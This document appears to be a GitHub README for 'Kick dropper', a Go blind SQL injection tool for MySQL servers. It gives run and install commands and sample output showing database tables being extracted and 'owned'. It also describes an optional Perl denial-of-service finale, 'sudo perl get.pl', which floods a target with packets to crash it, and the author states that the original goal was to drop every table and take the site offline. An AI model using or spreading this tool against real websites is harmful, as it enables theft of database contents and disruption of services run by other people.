```
 __  __ __        __           _____        ______                         
|  |/  |__|.----.|  |--.______|     \.----.|      |.-----.-----.-----.----.
|     <|  ||  __||    <|______|  --  |   _||  --  ||  _  |  _  |  -__|   _|
|__|\__|__||____||__|__|      |_____/|__|  |______||   __|   __|_____|__|  
                                                   |__|  |__|              
                         ___
                        __H__
                         [']
                         [)]
                         ["]
                          V...Data....Inspired by SQLMAP
Powered by GoLang
-----------------------------------------------------------------------------

[22:4:42]  [INFO] CONNECTED: HTTP Status > [ 200 ]
+-----------+--------------+
|    Number |    Paramater |
+===========+==============+
|         1 |        catId |
+-----------+--------------+

[22:4:42]  [INFO] Found PARAMATERS to target, please enter the following number which you want to use ( EX: 1)
1

```

Kick dropper is a very simple and leightweight demonstration of SQL querying, and injection by parsing URl's, inspired by SQLmap with data output but not as fast, you might be asking why kick dropper, well the original plan was to download all of the database information, then drop every single table in every database it had and then thus terminating the website, however i could not find a way to properly do this and extracting the info just was not working, so i added something extra at the end 

# how it works 
```
this is a very very simple blind SQL Injection script for MySQL servers ONLY

as the pre set query commanda are well exactly MySQL servers or will only execute for those servers 

this script connects and parses the DB, injects the URL and parses through a list or array of characters 

to match up to the name of the database or table ex

+----------------+
|           Name |
+================+
|    TBL_whatever |
+----------------+

```

# general usage and syntax 
```
go run main.go --url "<url>" | ex go run main.go --url "http://testphp.vulnweb.com/index.php?id=1"
```

# first output and input prompt 

```

[22:4:42]  [INFO] CONNECTED: HTTP Status > [ 200 ]
+-----------+--------------+
|    Number |    Paramater |
+===========+==============+
|         1 |        catId |
+-----------+--------------+

[22:4:42]  [INFO] Found PARAMATERS to target, please enter the following number which you want to use ( EX: 1)

```

when you are prompted to this then you will need to input the number in which the paramater is on ex 1

# output of tables 

i know the output is very very slow but depending on the URL it can out preform certian tools, when i was testing this tool on my own server it seems as if sqlmap wouldnt make a proper connection, however this still did, that was until i used verbose lv6 , random agent, tor, tor-type, u, dbms MySQL etc to speed up the process and actually get it to make requests and retrieve all the data

```
example output 


[22:4:42]  [DATA] TO OWN/RETRIEVE      =>  TBL_whatever
[22:4:42]  [DOWNLOAD 6] TABLE OWNED  =>  TBL_whatever
+----------------+
|           Name |
+================+
|    TBL_whatever |
+----------------+

[22:4:42]  [DATA] TO OWN/RETRIEVE      => TBLname
[22:4:42]  [DOWNLOAD 7] TABLE OWNED  => TBLname
+----------------+
|           Name |
+================+
|    TBLname     |
+----------------+

[22:4:42]  [DATA] TO OWN/RETRIEVE      => TBLadmin
[22:4:42]  [DOWNLOAD 8] TABLE OWNED  => TBLadmin
+-----------------+
|            Name |
+=================+
|    TBLadmin     |
+-----------------+

[22:4:42]  [DATA] TO OWN/RETRIEVE      => TBLname
[22:4:42]  [DOWNLOAD 9] TABLE OWNED  => TBLwhatever
+--------------+
|         Name |
+==============+
|    TB4       |
+--------------+

[22:4:42]  [DATA] TO OWN/RETRIEVE      => TBL4
[22:4:42]  [DOWNLOAD 10] TABLE OWNED  => TBL1
+-------------+
|        Name |
+=============+
|    TBL1     |
+-------------+
```

# main and finale function aka Kick the ass of the server 

powered with perl this is a simple DOS to knock or DROP kick the server offline for a bit, this is optional, after all is done when it comes to SQL injecting you will get something like the following output

```

[22:4:42]  [DATA] TO OWN/RETRIEVE      => finished gathering at =>  2022-01-09 22:25:29.959780903 -0500 EST m=+1247.694968902
[22:4:42]  [WARNING] [ WARNING ATTACK INITATION ] DROPPING SERVER IN 10 SECONDS
domain name .com 
[22:4:42]  [WARNING] [ WARNING ATTACK INITATION ] DROPPING SERVER.............
domain IP => domain ip address


 please now enter this command in your terminal 
+--------------------------------------------+
|                COMMAND TO KICK DROP SERVER |
+============================================+
|    sudo perl get.pl 1.1.1.1 domainip       |
+--------------------------------------------+

```

this command you will then run as the ip address you were given the following output will occur  < Example > 

```
[ DATA ] SENT => 78529 packets to => 127.0.0.1
[ DATA ] SENT => 78530 packets to => 127.0.0.1
[ DATA ] SENT => 78531 packets to => 127.0.0.1
[ DATA ] SENT => 78532 packets to => 127.0.0.1
[ DATA ] SENT => 78533 packets to => 127.0.0.1
[ DATA ] SENT => 78534 packets to => 127.0.0.1
[ DATA ] SENT => 78535 packets to => 127.0.0.1
[ DATA ] SENT => 78536 packets to => 127.0.0.1
[ DATA ] SENT => 78537 packets to => 127.0.0.1
[ DATA ] SENT => 78538 packets to => 127.0.0.1
[ DATA ] SENT => 78539 packets to => 127.0.0.1
[ DATA ] SENT => 78540 packets to => 127.0.0.1
```

in a few good seconds you should have sent anywhere between 95,000 to 400,000 packets to the server probobly crashing it for a second, its a in built feature you just gotta say `why not`

# servers supported 

```
MySQL Newest and oldest tested on both
```

# installs

```
git clone https://github.com/ArkAngeL43/Kick-Dr00per.git ; cd Kick-Dr00per ; chmod +x ./install.sh ; ./install.sh 
```




